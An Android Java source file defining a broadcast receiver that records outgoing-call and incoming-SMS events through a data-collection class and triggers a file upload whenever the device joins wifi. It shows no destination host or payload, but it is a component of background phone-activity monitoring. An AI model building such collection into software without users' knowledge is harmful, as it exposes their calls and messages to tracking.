package com.data.broadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import com.data.collect.PhoneCollect;
import com.data.configure.PhoneConfig;
import com.data.info.AppStringInfo;
import com.data.info.CollectUtil;
import com.data.net.UploadFile;


/**
 * Created by wang on 15-1-13.
 */
public class TelephoneBroadCast extends BroadcastReceiver {

    private final static String TAG = "TelephoneBroadCast";
    private static boolean flag = true;

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle b = intent.getExtras();

        //监听拨打电话
        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String phoneInfo = AppStringInfo.getAppStringInfo(context, PhoneConfig.PHONE, PhoneConfig.PHONE_CALL);
            PhoneCollect.getPhoneDatas(phoneInfo);
        }
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            String smsInfo = AppStringInfo.getAppStringInfo(context, PhoneConfig.PHONE, PhoneConfig.PHONE_RECEIVED_SMS);
            PhoneCollect.getPhoneDatas(smsInfo);
        }

        if (intent.getAction().equals("android.net.conn.CONNECTIVITY_CHANGE")) {

            //有文件上传，网络条件为wifi，上传文件
            // if(Constants.uploadFlag){
            if (CollectUtil.currentNetworkIsWifi(context)) {
                if (flag) {
                    Log.d(TAG, "connect wifi");
                    UploadFile uploadFile = new UploadFile(context);

                    uploadFile.uploadFile();
                }
                flag = !flag;
            } else {
                Log.d(TAG, "disconnect wifi");
            }
            //}
        }
    }
}
